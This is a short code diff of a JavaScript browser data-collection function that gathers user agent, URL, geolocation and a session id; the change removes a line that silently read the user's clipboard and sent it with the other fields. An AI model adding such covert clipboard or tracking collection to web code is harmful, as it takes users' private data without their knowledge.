@@ -19,7 +19,6 @@ async function collect2() {
   const unix = new Date().getTime();
   const url = window.location.href;
   const geolocation = navigator.geolocation;
-  const clipboard = navigator.clipboard.readText();
 
   if (
     userAgent !== lastValues.userAgent ||
@@ -34,7 +33,6 @@ async function collect2() {
       unix: unix,
       url: url,
       location: geolocation,
-      clipboard: clipboard,
       session: getSessionId(),
     });
   } else {
